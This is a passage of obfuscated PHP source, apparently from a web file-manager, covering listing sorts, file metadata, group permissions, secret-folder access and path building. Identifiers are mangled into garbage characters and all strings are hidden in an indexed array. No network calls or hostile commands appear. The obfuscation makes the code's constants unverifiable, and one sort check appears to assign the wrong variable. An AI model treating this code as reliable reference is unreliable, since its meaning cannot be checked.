} } protected function _makeOrder($ğÂÉÏí¾ = false) { $Î±ß§‡ =& $_SERVER[¬ÏÕ§Áú]; $ôú™Ï¸¡ = Model($Î±ß§‡[539])->get($Î±ß§‡[540]); $âñµò”Œ = Model($Î±ß§‡[539])->get($Î±ß§‡[541]); $£ş§ªğ¨ = array($Î±ß§‡[542] => $Î±ß§‡[543], $Î±ß§‡[544] => $Î±ß§‡[545]); $¦¹£éŒ = array($Î±ß§‡[32] => $Î±ß§‡[32], $Î±ß§‡[89] => $Î±ß§‡[89], $Î±ß§‡[179] => $Î±ß§‡[506], $Î±ß§‡[546] => $Î±ß§‡[546], $Î±ß§‡[547] => $Î±ß§‡[548], $Î±ß§‡[244] => $Î±ß§‡[244], $Î±ß§‡[98] => $Î±ß§‡[98]); $Ş…‚È‰ = Input::get($Î±ß§‡[549], $Î±ß§‡[7], $ôú™Ï¸¡, array_keys($¦¹£éŒ)); $şö€úåù = Input::get($Î±ß§‡[550], $Î±ß§‡[7], $âñµò”Œ, array_keys($£ş§ªğ¨)); if (!in_array($Ş…‚È‰, array_keys($¦¹£éŒ))) { $Ş…‚È‰ = $Î±ß§‡[32]; } if (!in_array($şö€úåù, array_keys($£ş§ªğ¨))) { $Ş…‚È‰ = $Î±ß§‡[542]; } if ($Ş…‚È‰ == $Î±ß§‡[32]) { } $¯¯ùØç„ = $Î±ß§‡[551] . $¦¹£éŒ[$Ş…‚È‰] . $Î±ß§‡[53] . $£ş§ªğ¨[$şö€úåù]; $¯¯ùØç„ = rtrim(trim($¯¯ùØç„), $Î±ß§‡[50]); if ($ğÂÉÏí¾) { return array($¯¯ùØç„, $£ş§ªğ¨[$şö€úåù]); } return $this->order($¯¯ùØç„); } protected function _listDataApplyItem($¹ÂµŸ­æ, $¿¯İôğ± = false) { $¼©ÔºìÜ = array($¹ÂµŸ­æ); $this->_listDataApply($¼©ÔºìÜ, $¿¯İôğ±); return $¼©ÔºìÜ[0]; } protected function _listDataApply(&$³÷‚‰ûØ, $³º›ùëÎ = false) { $Ú—Âœ¿° =& $_SERVER[¬ÏÕ§Áú]; if (!$³÷‚‰ûØ) { $³÷‚‰ûØ = array(); return; } $´ïæËœå = array_to_keyvalue($³÷‚‰ûØ, $Ú—Âœ¿°[12], $Ú—Âœ¿°[204]); $´ïæËœå = array_unique($´ïæËœå); $´ïæËœå = array_to_int($´ïæËœå); $this->_listSourceCache($³÷‚‰ûØ); if (!$³º›ùëÎ) { $this->_listAppendMeta($³÷‚‰ûØ, $´ïæËœå); $this->_listAppendFileMeta($³÷‚‰ûØ, $´ïæËœå); $this->_listAppendChildren($³÷‚‰ûØ, $´ïæËœå); } $this->_listAppendPath($³÷‚‰ûØ); $this->_listAppendAuth($³÷‚‰ûØ); $this->_listAppendSourceInfo($³÷‚‰ûØ, $´ïæËœå); $this->_listAppendUser($³÷‚‰ûØ); $this->_listFilterInfo($³÷‚‰ûØ, $³º›ùëÎ); $this->_listAppendAuthSecret($³÷‚‰ûØ); } protected function _listSourceCache($ªğÑ¹“ò) { $ñÅº¦·‰ =& $_SERVER[¬ÏÕ§Áú]; foreach ($ªğÑ¹“ò as $¤––Âá) { self::$cacheSourceInfo[$ñÅº¦·‰[552] . $¤––Âá[$ñÅº¦·‰[204]]] = $¤––Âá; } } protected function _listFilterInfo(&$®©÷ÄÙ, $Ä§ÜŞ·Ã = false) { $§æúîÂ£ =& $_SERVER[¬ÏÕ§Áú]; foreach ($®©÷ÄÙ as &$×ï¿¯•´) { $×ï¿¯•´ = $this->pathInfoFilter($×ï¿¯•´); self::$cachePathInfo[$§æúîÂ£[553] . intval($Ä§ÜŞ·Ã) . $§æúîÂ£[482] . $×ï¿¯•´[$§æúîÂ£[204]]] = $×ï¿¯•´; } unset($×ï¿¯•´); } protected function _listMake(&$Òá¨‹ö®) { $äå¸Œ¦´ =& $_SERVER[¬ÏÕ§Áú]; $Òá¨‹ö®[$äå¸Œ¦´[95]] = array(); $Òá¨‹ö®[$äå¸Œ¦´[96]] = array(); foreach ($Òá¨‹ö®[$äå¸Œ¦´[456]] as $´Ôãºöû) { $ş­„¼Æ = $´Ôãºöû[$äå¸Œ¦´[505]] == 1 ? $äå¸Œ¦´[95] : $äå¸Œ¦´[96]; $Òá¨‹ö®[$ş­„¼Æ][] = $´Ôãºöû; } unset($Òá¨‹ö®[$äå¸Œ¦´[456]]); } protected function _listAppendMeta(&$å×´óê¶, $ùôÜ×ö) { $“ˆáéû¬ =& $_SERVER[¬ÏÕ§Áú]; $Šîã—˜ò = array($“ˆáéû¬[511] => array($“ˆáéû¬[512], $ùôÜ×ö)); $ş²ÇŠáÍ = Model($“ˆáéû¬[554])->field($“ˆáéû¬[555])->where($Šîã—˜ò)->select(); if (!$ş²ÇŠáÍ) { return; } $ˆñÙ¿ = array($“ˆáéû¬[556], $“ˆáéû¬[557], $“ˆáéû¬[536]); $òŒÄÒëš = array(); foreach ($ş²ÇŠáÍ as $®¹°¡¬…) { if (!isset($òŒÄÒëš[$®¹°¡¬…[$“ˆáéû¬[204]]])) { $òŒÄÒëš[$®¹°¡¬…[$“ˆáéû¬[204]]] = array(); } if (in_array($®¹°¡¬…[$“ˆáéû¬[107]], $ˆñÙ¿)) { continue; } if ($®¹°¡¬…[$“ˆáéû¬[107]] == $“ˆáéû¬[558]) { $®¹°¡¬…[$“ˆáéû¬[461]] = $“ˆáéû¬[559]; } $òŒÄÒëš[$®¹°¡¬…[$“ˆáéû¬[204]]][$®¹°¡¬…[$“ˆáéû¬[107]]] = $®¹°¡¬…[$“ˆáéû¬[461]]; } foreach ($å×´óê¶ as &$½°¿†£ğ) { $½°¿†£ğ[$“ˆáéû¬[560]] = !1; if (isset($òŒÄÒëš[$½°¿†£ğ[$“ˆáéû¬[204]]])) { $½°¿†£ğ[$“ˆáéû¬[560]] = $òŒÄÒëš[$½°¿†£ğ[$“ˆáéû¬[204]]]; } if ($this->fileIsLock($½°¿†£ğ) && $½°¿†£ğ[$“ˆáéû¬[507]]) { $øƒïÃµ® = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $½°¿†£ğ[$“ˆáéû¬[507]][$“ˆáéû¬[508]] = AuthModel::authDisable($½°¿†£ğ[$“ˆáéû¬[507]][$“ˆáéû¬[508]], $øƒïÃµ®); $½°¿†£ğ[$“ˆáéû¬[507]][$“ˆáéû¬[561]][$“ˆáéû¬[507]] = $½°¿†£ğ[$“ˆáéû¬[507]][$“ˆáéû¬[508]]; } } unset($½°¿†£ğ); } protected function _listAppendFileMeta(&$™—©¿, $˜²ÑğÏ„) { $âŒöç =& $_SERVER[¬ÏÕ§Áú]; $â¯ĞèÔ = array_to_keyvalue($™—©¿, $âŒöç[12], $âŒöç[562]); $â¯ĞèÔ = array_filter(array_unique($â¯ĞèÔ)); $â¯ĞèÔ = array_to_int($â¯ĞèÔ); if (!$â¯ĞèÔ) { return; } $›èèíû‚ = array($âŒöç[563] => array($âŒöç[512], $â¯ĞèÔ)); $îˆ ’Æ = $âŒöç[564]; $ıÖñó¥ù = Model($âŒöç[565])->field($îˆ ’Æ)->where($›èèíû‚)->select(); $ıÖñó¥ù = array_to_keyvalue($ıÖñó¥ù, $âŒöç[562]); $„ìÙ¡ˆ° = Model($âŒöç[566])->field($âŒöç[567])->where($›èèíû‚)->select(); $„ìÙ¡ˆ° = $„ìÙ¡ˆ° ? $„ìÙ¡ˆ° : array(); $Ü“€˜›» = array(); foreach ($„ìÙ¡ˆ° as $Üœ ºËü) { if (!isset($Ü“€˜›»[$Üœ ºËü[$âŒöç[562]]])) { $Ü“€˜›»[$Üœ ºËü[$âŒöç[562]]] = array(); } $Ü“€˜›»[$Üœ ºËü[$âŒöç[562]]][$Üœ ºËü[$âŒöç[107]]] = $Üœ ºËü[$âŒöç[461]]; } foreach ($™—©¿ as &$òÆ¥Õ) { $ˆÍı´¼Ê = $òÆ¥Õ[$âŒöç[562]]; if (!$ˆÍı´¼Ê || !is_array($ıÖñó¥ù[$ˆÍı´¼Ê])) { continue; } $“¬€Œƒ = $ıÖñó¥ù[$ˆÍı´¼Ê]; $“¬€Œƒ[$âŒöç[89]] = $òÆ¥Õ[$âŒöç[89]]; $“¬€Œƒ[$âŒöç[32]] = $òÆ¥Õ[$âŒöç[32]]; if (!$“¬€Œƒ[$âŒöç[568]]) { Model($âŒöç[565])->fileMd5Check($“¬€Œƒ); } if (!isset(self::$cacheFileInfo[$âŒöç[569] . $ˆÍı´¼Ê])) { self::$cacheFileInfo[$âŒöç[569] . $ˆÍı´¼Ê] = array_merge(array(), $“¬€Œƒ); } unset($ıÖñó¥ù[$ˆÍı´¼Ê][$âŒöç[97]]); $áçæş¼ = isset($Ü“€˜›»[$ˆÍı´¼Ê]) && is_array($Ü“€˜›»[$ˆÍı´¼Ê]) ? $Ü“€˜›»[$ˆÍı´¼Ê] : array(); $òÆ¥Õ[$âŒöç[180]] = array_merge($áçæş¼, $ıÖñó¥ù[$ˆÍı´¼Ê]); if (isset($òÆ¥Õ[$âŒöç[180]][$âŒöç[195]])) { $òÆ¥Õ[$âŒöç[195]] = json_decode($òÆ¥Õ[$âŒöç[180]][$âŒöç[195]], !0); unset($òÆ¥Õ[$âŒöç[180]][$âŒöç[195]]); } } unset($òÆ¥Õ); } protected function _listAppendSourceInfo(&$¶İ‰éÎ”, $‹ÙÆĞëÓ) { $ƒ·çÓ¢¥ =& $_SERVER[¬ÏÕ§Áú]; $Úª¶ÖÂ¨ = Model($ƒ·çÓ¢¥[570])->listData(); $Á·¡³û = Model($ƒ·çÓ¢¥[519])->listData(); $ï‚ÜŞ¢å = Model($ƒ·çÓ¢¥[509])->listData(); $òš†ĞÔ¥ = Model($ƒ·çÓ¢¥[571])->listSimple(); $ò‹£ÄÅÆ = array_to_keyvalue($Úª¶ÖÂ¨, $ƒ·çÓ¢¥[492]); $á˜ØÑì = array_to_keyvalue_group($Á·¡³û, $ƒ·çÓ¢¥[97], $ƒ·çÓ¢¥[520]); $–ú—…¼Ÿ = array_to_keyvalue($ï‚ÜŞ¢å, $ƒ·çÓ¢¥[97]); $È«ˆ¾‚® = array_to_keyvalue_group($òš†ĞÔ¥, $ƒ·çÓ¢¥[204]); foreach ($¶İ‰éÎ” as &$âÀ•ó¶à) { $âÀ•ó¶à[$ƒ·çÓ¢¥[100]] = array($ƒ·çÓ¢¥[572] => 0, $ƒ·çÓ¢¥[573] => 0, $ƒ·çÓ¢¥[574] => 0); if (isset($–ú—…¼Ÿ[$âÀ•ó¶à[$ƒ·çÓ¢¥[204]]])) { $âÀ•ó¶à[$ƒ·çÓ¢¥[100]][$ƒ·çÓ¢¥[575]] = 1; $âÀ•ó¶à[$ƒ·çÓ¢¥[100]][$ƒ·çÓ¢¥[576]] = $–ú—…¼Ÿ[$âÀ•ó¶à[$ƒ·çÓ¢¥[204]]][$ƒ·çÓ¢¥[32]]; } if ($á˜ØÑì && $ò‹£ÄÅÆ && isset($á˜ØÑì[$âÀ•ó¶à[$ƒ·çÓ¢¥[204]]])) { $âÀ•ó¶à[$ƒ·çÓ¢¥[100]][$ƒ·çÓ¢¥[577]] = array(); foreach ($á˜ØÑì[$âÀ•ó¶à[$ƒ·çÓ¢¥[204]]] as $Î‡ÎöÆ’) { $ËÒ–°Å = $ò‹£ÄÅÆ[$Î‡ÎöÆ’]; $âÀ•ó¶à[$ƒ·çÓ¢¥[100]][$ƒ·çÓ¢¥[577]][] = array($ƒ·çÓ¢¥[578] => $ËÒ–°Å[$ƒ·çÓ¢¥[492]], $ƒ·çÓ¢¥[514] => $ËÒ–°Å[$ƒ·çÓ¢¥[32]], $ƒ·çÓ¢¥[579] => $ËÒ–°Å[$ƒ·çÓ¢¥[580]]); } } if ($È«ˆ¾‚® && isset($È«ˆ¾‚®[$âÀ•ó¶à[$ƒ·çÓ¢¥[204]]])) { $âÀ•ó¶à[$ƒ·çÓ¢¥[100]][$ƒ·çÓ¢¥[581]] = array(); foreach ($È«ˆ¾‚®[$âÀ•ó¶à[$ƒ·çÓ¢¥[204]]] as $‰ÅŠÉƒ’) { $ı¤ô¼äü = $ƒ·çÓ¢¥[582]; if ($‰ÅŠÉƒ’[$ƒ·çÓ¢¥[583]] == $ƒ·çÓ¢¥[101]) { $ı¤ô¼äü .= $ƒ·çÓ¢¥[584]; } $âÀ•ó¶à[$ƒ·çÓ¢¥[100]][$ƒ·çÓ¢¥[581]] = array_field_key($‰ÅŠÉƒ’, explode($ƒ·çÓ¢¥[50], $ı¤ô¼äü)); } } } unset($âÀ•ó¶à); return $¶İ‰éÎ”; } protected function _listAppendChildren(&$Ö¯ù ƒ, $àÀÊª£¥) { $ßÎåË±‚ =& $_SERVER[¬ÏÕ§Áú]; $½–äÈğ = array(); $³á¹üØ¡ = array($ßÎåË±‚[252] => 0, $ßÎåË±‚[253] => 0); foreach ($Ö¯ù ƒ as &$™¢ùÂ¢÷) { if (!$™¢ùÂ¢÷[$ßÎåË±‚[505]]) { continue; } $½–äÈğ[] = intval($™¢ùÂ¢÷[$ßÎåË±‚[204]]); } unset($™¢ùÂ¢÷); if (!$½–äÈğ) { return; } $ˆ¤ÃÓ = array($ßÎåË±‚[203] => array($ßÎåË±‚[7], $½–äÈğ), $ßÎåË±‚[525] => 0); $â›¼İÕ = array($ßÎåË±‚[203], $ßÎåË±‚[505], $ßÎåË±‚[585] => $ßÎåË±‚[586]); $ôÎƒ“° = $this->field($â›¼İÕ)->where($ˆ¤ÃÓ)->group($ßÎåË±‚[587])->select(); $Üé¥§¶ = array(); foreach ($ôÎƒ“° as $ç²¹÷) { $†¥«èö = $ç²¹÷[$ßÎåË±‚[203]]; $†ÎÜ…ÉÀ = $ç²¹÷[$ßÎåË±‚[505]] == $ßÎåË±‚[101] ? $ßÎåË±‚[253] : $ßÎåË±‚[252]; if (!isset($Üé¥§¶[$†¥«èö])) { $Üé¥§¶[$†¥«èö] = array($ßÎåË±‚[252] => 0, $ßÎåË±‚[253] => 0); } $Üé¥§¶[$†¥«èö][$†ÎÜ…ÉÀ] += $ç²¹÷[$ßÎåË±‚[586]]; } foreach ($Ö¯ù ƒ as &$™¢ùÂ¢÷) { if (!$™¢ùÂ¢÷[$ßÎåË±‚[505]]) { continue; } $ÎııŞ‚ô = is_array($Üé¥§¶[$™¢ùÂ¢÷[$ßÎåË±‚[204]]]) ? $Üé¥§¶[$™¢ùÂ¢÷[$ßÎåË±‚[204]]] : $³á¹üØ¡; $™¢ùÂ¢÷[$ßÎåË±‚[253]] = $ÎııŞ‚ô[$ßÎåË±‚[253]]; $™¢ùÂ¢÷[$ßÎåË±‚[252]] = $ÎııŞ‚ô[$ßÎåË±‚[252]]; unset($™¢ùÂ¢÷[$ßÎåË±‚[506]]); } unset($™¢ùÂ¢÷); } protected function _listAppendAuth(&$ï€·Ñ–) { $÷•É±‰¬ =& $_SERVER[¬ÏÕ§Áú]; $úšõëÑ¹ = array(); foreach ($ï€·Ñ– as $Û±ÖÃ‡à) { if ($Û±ÖÃ‡à[$÷•É±‰¬[201]] == self::TYPE_GROUP) { $úšõëÑ¹[] = intval($Û±ÖÃ‡à[$÷•É±‰¬[204]]); } } if (!$úšõëÑ¹) { return; } $×±‰åõè = array_to_keyvalue($ï€·Ñ–, $÷•É±‰¬[204]); $Îã°õŒ = Model($÷•É±‰¬[588])->getSourceList($úšõëÑ¹, $×±‰åõè); $ÖÉÖô²Å = KodUser::isRoot(); foreach ($ï€·Ñ– as $ğ¢İÒ‹… => &$Û±ÖÃ‡à) { $Û±ÖÃ‡à[$÷•É±‰¬[507]] = $Îã°õŒ[$Û±ÖÃ‡à[$÷•É±‰¬[204]]]; if (!$Û±ÖÃ‡à[$÷•É±‰¬[507]] && $Û±ÖÃ‡à[$÷•É±‰¬[201]] == self::TYPE_GROUP) { $Û±ÖÃ‡à[$÷•É±‰¬[507]] = Action($÷•É±‰¬[589])->pathGroupAuthMake($Û±ÖÃ‡à[$÷•É±‰¬[590]]); if (!$Û±ÖÃ‡à[$÷•É±‰¬[507]] && !$ÖÉÖô²Å) { $Û±ÖÃ‡à[$÷•É±‰¬[246]] = !1; $Û±ÖÃ‡à[$÷•É±‰¬[245]] = !1; } } if ($Û±ÖÃ‡à[$÷•É±‰¬[507]]) { $Û±ÖÃ‡à[$÷•É±‰¬[246]] = AuthModel::authCheckEdit($Û±ÖÃ‡à[$÷•É±‰¬[507]][$÷•É±‰¬[508]]); $Û±ÖÃ‡à[$÷•É±‰¬[245]] = AuthModel::authCheckView($Û±ÖÃ‡à[$÷•É±‰¬[507]][$÷•É±‰¬[508]]); } $this->groupPathDisplay($Û±ÖÃ‡à); } unset($Û±ÖÃ‡à); } public function _listAppendAuthSecret(&$Ñƒè«Ú) { $ô¡ØëÛŠ =& $_SERVER[¬ÏÕ§Áú]; if (Model($ô¡ØëÛŠ[527])->get($ô¡ØëÛŠ[591]) != $ô¡ØëÛŠ[101]) { return; } static $ççËšÙ = false; if (!$ççËšÙ) { $ÁŞœÅ¡â = Model($ô¡ØëÛŠ[592]); $ºİ‚ñŒ = Model($ô¡ØëÛŠ[593]); $ççËšÙ = $ºİ‚ñŒ->listData(); $ççËšÙ = array_to_keyvalue($ççËšÙ, $ô¡ØëÛŠ[204]); $«ˆëõ = json_decode(Model($ô¡ØëÛŠ[527])->get($ô¡ØëÛŠ[594]), !0); $«ˆëõ = array_to_keyvalue($«ˆëõ, $ô¡ØëÛŠ[492]); foreach ($ççËšÙ as $š§Íû“Ÿ => $Æá¡Íôõ) { $¢¬Ê—ŠÙ = $«ˆëõ[$Æá¡Íôõ[$ô¡ØëÛŠ[595]]]; if (!$¢¬Ê—ŠÙ) { $ºİ‚ñŒ->remove($Æá¡Íôõ[$ô¡ØëÛŠ[492]]); unset($ççËšÙ[$š§Íû“Ÿ]); continue; } $Ñ­ ¤‡ = $ÁŞœÅ¡â->listData($¢¬Ê—ŠÙ[$ô¡ØëÛŠ[507]]); if (!$Ñ­ ¤‡) { $ºİ‚ñŒ->remove($Æá¡Íôõ[$ô¡ØëÛŠ[492]]); unset($ççËšÙ[$š§Íû“Ÿ]); continue; } $Æá¡Íôõ[$ô¡ØëÛŠ[507]] = $Ñ­ ¤‡; $Æá¡Íôõ[$ô¡ØëÛŠ[596]] = $¢¬Ê—ŠÙ; $Æá¡Íôõ[$ô¡ØëÛŠ[597]] = Model($ô¡ØëÛŠ[598])->getInfoSimpleOuter($Æá¡Íôõ[$ô¡ØëÛŠ[546]]); $ççËšÙ[$š§Íû“Ÿ] = $Æá¡Íôõ; } } $»òŞóñ´ = USER_ID; $¤µÚƒ…¬ = array(); $°Š†óú… = $this->_listAppendPath($¤µÚƒ…¬, !0); foreach ($Ñƒè«Ú as $š§Íû“Ÿ => &$Æá¡Íôõ) { if (!is_array($Æá¡Íôõ[$ô¡ØëÛŠ[507]])) { continue; } if ($Æá¡Íôõ[$ô¡ØëÛŠ[201]] != $ô¡ØëÛŠ[599]) { continue; } if (isset($ççËšÙ[$Æá¡Íôõ[$ô¡ØëÛŠ[204]]])) { $„… ºüÜ = $ççËšÙ[$Æá¡Íôõ[$ô¡ØëÛŠ[204]]]; if (!is_array($Æá¡Íôõ[$ô¡ØëÛŠ[560]])) { $Æá¡Íôõ[$ô¡ØëÛŠ[560]] = array(); } $Æá¡Íôõ[$ô¡ØëÛŠ[560]][$ô¡ØëÛŠ[600]] = $„… ºüÜ[$ô¡ØëÛŠ[595]]; $Æá¡Íôõ[$ô¡ØëÛŠ[507]][$ô¡ØëÛŠ[601]] = $„… ºüÜ; $Æá¡Íôõ[$ô¡ØëÛŠ[507]][$ô¡ØëÛŠ[602]] = $Æá¡Íôõ[$ô¡ØëÛŠ[603]]; $Æá¡Íôõ[$ô¡ØëÛŠ[507]][$ô¡ØëÛŠ[604]] = $ô¡ØëÛŠ[101]; if ($„… ºüÜ[$ô¡ØëÛŠ[546]] != $»òŞóñ´) { $Æá¡Íôõ[$ô¡ØëÛŠ[507]][$ô¡ØëÛŠ[508]] = $Æá¡Íôõ[$ô¡ØëÛŠ[507]][$ô¡ØëÛŠ[508]] & $„… ºüÜ[$ô¡ØëÛŠ[507]][$ô¡ØëÛŠ[507]]; } continue; } $­Ô–¦Æ = $this->parentLevelArray($Æá¡Íôõ[$ô¡ØëÛŠ[605]]); $Ğ––¯åƒ = array_reverse($­Ô–¦Æ); foreach ($Ğ––¯åƒ as $¸ş¼ğŸ¢ => $¤µ¬º€·) { if (!isset($ççËšÙ[$¤µ¬º€·])) { continue; } $„… ºüÜ = $ççËšÙ[$¤µ¬º€·]; $Æá¡Íôõ[$ô¡ØëÛŠ[507]][$ô¡ØëÛŠ[601]] = $„… ºüÜ; if ($„… ºüÜ[$ô¡ØëÛŠ[546]] != $»òŞóñ´) { $Æá¡Íôõ[$ô¡ØëÛŠ[507]][$ô¡ØëÛŠ[508]] = $Æá¡Íôõ[$ô¡ØëÛŠ[507]][$ô¡ØëÛŠ[508]] & $„… ºüÜ[$ô¡ØëÛŠ[507]][$ô¡ØëÛŠ[507]]; } $¹·öß…Â = $ô¡ØëÛŠ[12]; $¶»ÁÊ£ã = count($­Ô–¦Æ) - $¸ş¼ğŸ¢; for ($ÄÀœƒÒ = 0; $ÄÀœƒÒ < $¶»ÁÊ£ã; $ÄÀœƒÒ++) { if (!isset($°Š†óú…[$­Ô–¦Æ[$ÄÀœƒÒ]])) { $¹·öß…Â = $ô¡ØëÛŠ[12]; break; } $¹·öß…Â = $¹·öß…Â . rtrim($°Š†óú…[$­Ô–¦Æ[$ÄÀœƒÒ]], $ô¡ØëÛŠ[8]) . $ô¡ØëÛŠ[8]; } $Æá¡Íôõ[$ô¡ØëÛŠ[507]][$ô¡ØëÛŠ[602]] = rtrim($¹·öß…Â, $ô¡ØëÛŠ[8]) . $ô¡ØëÛŠ[8]; break; } } unset($Æá¡Íôõ); } public function groupPathDisplay(&$Å¥Éı¿) { $­şÂ×›æ =& $_SERVER[¬ÏÕ§Áú]; if ($Å¥Éı¿[$­şÂ×›æ[201]] != self::TYPE_GROUP) { return; } $‘Ï‹è† = Model($­şÂ×›æ[606])->getInfo($Å¥Éı¿[$­şÂ×›æ[590]]); $ø‚“·Ì‰ = $this->parentLevelArray($‘Ï‹è†[$­şÂ×›æ[605]]); $¦¹Û°êö = $­şÂ×›æ[12]; foreach ($ø‚“·Ì‰ as $À‹‚”úİ) { $»º•®± = Model($­şÂ×›æ[606])->getInfo($À‹‚”úİ); $¦¹Û°êö .= $»º•®±[$­şÂ×›æ[100]][$­şÂ×›æ[204]] . $­şÂ×›æ[50]; } $Å¥Éı¿[$­şÂ×›æ[607]] = $‘Ï‹è†[$­şÂ×›æ[203]]; $Å¥Éı¿[$­şÂ×›æ[608]] = $‘Ï‹è†[$­şÂ×›æ[605]]; $Å¥Éı¿[$­şÂ×›æ[609]] = $‘Ï‹è†[$­şÂ×›æ[610]]; $Å¥Éı¿[$­şÂ×›æ[611]] = $¦¹Û°êö . $‘Ï‹è†[$­şÂ×›æ[100]][$­şÂ×›æ[204]]; } protected function _listAppendPath(&$°ô ±³’, $õìü¸ª„ = false) { $í‹º­ñ± =& $_SERVER[¬ÏÕ§Áú]; static $õÔ™í· = array(); $äİÃëƒ¿ = array(); $“öøÚ² = array(); if ($õìü¸ª„) { return $õÔ™í·; } foreach ($°ô ±³’ as &$¨Š®ØË) { $ĞÔ²ş´È = $¨Š®ØË[$í‹º­ñ±[204]]; if ($¨Š®ØË[$í‹º­ñ±[505]] == $í‹º­ñ±[101] && $¨Š®ØË[$í‹º­ñ±[203]] != 0) { $õÔ™í·[$ĞÔ²ş´È] = $¨Š®ØË[$í‹º­ñ±[32]]; } if ($¨Š®ØË[$í‹º­ñ±[505]] == $í‹º­ñ±[101] && $¨Š®ØË[$í‹º­ñ±[203]] == 0) { $õÔ™í·[$ĞÔ²ş´È] = $this->_listAppendPathRoot($¨Š®ØË, array()); } if (isset($“öøÚ²[$¨Š®ØË[$í‹º­ñ±[605]]])) { continue; } $“öøÚ²[$¨Š®ØË[$í‹º­ñ±[605]]] = !0; $¬’Ïù¤Ë = $this->parentLevelArray($¨Š®ØË[$í‹º­ñ±[605]]); foreach ($¬’Ïù¤Ë as $¨Óîğ¤¾ => $¿Í ©†) { if (isset($õÔ™í·[$¿Í ©†])) { continue; } if ($¨Óîğ¤¾ == 0) { $õÔ™í·[$¿Í ©†] = $this->_listAppendPathRoot($¨Š®ØË, $¬’Ïù¤Ë); } if ($¨Óîğ¤¾ != 0) { $äİÃëƒ¿[] = $¿Í ©†; } } } unset($¨Š®ØË); $äİÃëƒ¿ = array_unique($äİÃëƒ¿); if (count($äİÃëƒ¿) > 0) { $ƒ‚ëıÖ = array($í‹º­ñ±[511] => array($í‹º­ñ±[512], $äİÃëƒ¿)); if (count($äİÃëƒ¿) == 1) { $ ö”Ô = $this->sourceInfo($äİÃëƒ¿[0]); $ÏÏç©®å = is_array($ ö”Ô) ? array($ ö”Ô) : !1; } else { $ÏÏç©®å = $this->field($í‹º­ñ±[612])->where($ƒ‚ëıÖ)->select(); } if (!$ÏÏç©®å) { $ÏÏç©®å = array(); } foreach ($ÏÏç©®å as $•ÓñÂ¼) { $õÔ™í·[$•ÓñÂ¼[$í‹º­ñ±[204]]] = $•ÓñÂ¼[$í‹º­ñ±[32]]; } } $şàÓşš = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¿À—ìó = array(); foreach ($°ô ±³’ as &$¨Š®ØË) { $å•‡± = $¨Š®ØË[$í‹º­ñ±[605]]; $Êóñ¢Ì = $í‹º­ñ±[12]; if (isset($¿À—ìó[$å•‡±])) { $Êóñ¢Ì = $¿À—ìó[$å•‡±]; } else { $¬’Ïù¤Ë = $this->parentLevelArray($¨Š®ØË[$í‹º­ñ±[605]]); foreach ($¬’Ïù¤Ë as $¨Óîğ¤¾ => $¿Í ©†) { if (isset($õÔ™í·[$¿Í ©†])) { $Êóñ¢Ì .= $õÔ™í·[$¿Í ©†] . $í‹º­ñ±[8]; } } $¿À—ìó[$å•‡±] = $Êóñ¢Ì; } $Êóñ¢Ì .= $¨Š®ØË[$í‹º­ñ±[32]]; if ($¨Š®ØË[$í‹º­ñ±[505]] == $í‹º­ñ±[101]) { $Êóñ¢Ì .= $í‹º­ñ±[8]; } $¨Š®ØË[$í‹º­ñ±[603]] = str_replace($í‹º­ñ±[267], $í‹º­ñ±[8], $Êóñ¢Ì); if ($¨Š®ØË[$í‹º­ñ±[203]] == $í‹º­ñ±[241]) { $¨Š®ØË[$í‹º­ñ±[32]] = trim($õÔ™í·[$¨Š®ØË[$í‹º­ñ±[204]]], $í‹º­ñ±[8]); $¨Š®ØË[$í‹º­ñ±[603]] = $¨Š®ØË[$í‹º­ñ±[32]] . $í‹º­ñ±[8]; } if (intval($¨Š®ØË[$í‹º­ñ±[201]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($¨Š®ØË, $¬’Ïù¤Ë, $şàÓşš); } } unset($¨Š®ØË); return $°ô ±³’; } private function _listAppendPathRecycle(&$«ª¯‚öå, $Æø—Ÿ®ù, $ÖíÓ“ŸÍ) { $ÙœÀáÌŒ =& $_SERVER[¬ÏÕ§Áú]; if (!in_array($ÖíÓ“ŸÍ, $Æø—Ÿ®ù) && $«ª¯‚öå[$ÙœÀáÌŒ[204]] != $ÖíÓ“ŸÍ) { return; } $İÀ¶¢ÎÉ = explode($ÙœÀáÌŒ[8], trim($«ª¯‚öå[$ÙœÀáÌŒ[603]], $ÙœÀáÌŒ[8])); $‹–¼‘è = implode($ÙœÀáÌŒ[8], array_slice($İÀ¶¢ÎÉ, 2)); $«ª¯‚öå[$ÙœÀáÌŒ[603]] = $ÙœÀáÌŒ[8] . LNG($ÙœÀáÌŒ[613]) . $ÙœÀáÌŒ[8] . ltrim($‹–¼‘è, $ÙœÀáÌŒ[8]); $«ª¯‚öå[$ÙœÀáÌŒ[605]] = $ÙœÀáÌŒ[614] . implode($ÙœÀáÌŒ[50], array_slice($Æø—Ÿ®ù, 1)) . $ÙœÀáÌŒ[50]; if ($«ª¯‚öå[$ÙœÀáÌŒ[204]] == $ÖíÓ“ŸÍ) { $«ª¯‚öå[$ÙœÀáÌŒ[605]] = $ÙœÀáÌŒ[614]; $«ª¯‚öå[$ÙœÀáÌŒ[203]] = $ÙœÀáÌŒ[241]; $«ª¯‚öå[$ÙœÀáÌŒ[32]] = LNG($ÙœÀáÌŒ[613]); } $«ª¯‚öå[$ÙœÀáÌŒ[615]] = $ÙœÀáÌŒ[616]; } protected function _listAppendPathRoot(&$©ÔŸî÷», $ÍÂ¾éÍÊ) { $ıêêìš« =& $_SERVER[¬ÏÕ§Áú]; static $å¡¬ê©í = false; static $Ã©úºš… = false; $Û•Û©Ì¯ = $ıêêìš«[12]; if ($©ÔŸî÷»[$ıêêìš«[201]] == self::TYPE_USER) { if ($©ÔŸî÷»[$ıêêìš«[590]] == USER_ID) { $Û•Û©Ì¯ = LNG($ıêêìš«[617]); if ($å¡¬ê©í === !1) { $¾ä²×° = Model($ıêêìš«[618])->getInfoFull(USER_ID); $å¡¬ê©í = _get($¾ä²×°, $ıêêìš«[619], $ıêêìš«[12]); } if ($Ã©úºš… === !1) { $¾ä²×° = Model($ıêêìš«[618])->getInfoFull(USER_ID); $Ã©úºš… = _get($¾ä²×°, $ıêêìš«[620], $ıêêìš«[12]); } if ($ÍÂ¾éÍÊ && $ÍÂ¾éÍÊ[0] == $å¡¬ê©í || !$ÍÂ¾éÍÊ && $©ÔŸî÷»[$ıêêìš«[204]] == $å¡¬ê©í) { $Û•Û©Ì¯ = LNG($ıêêìš«[621]); $©ÔŸî÷»[$ıêêìš«[622]] = $ıêêìš«[623]; } if ($ÍÂ¾éÍÊ && 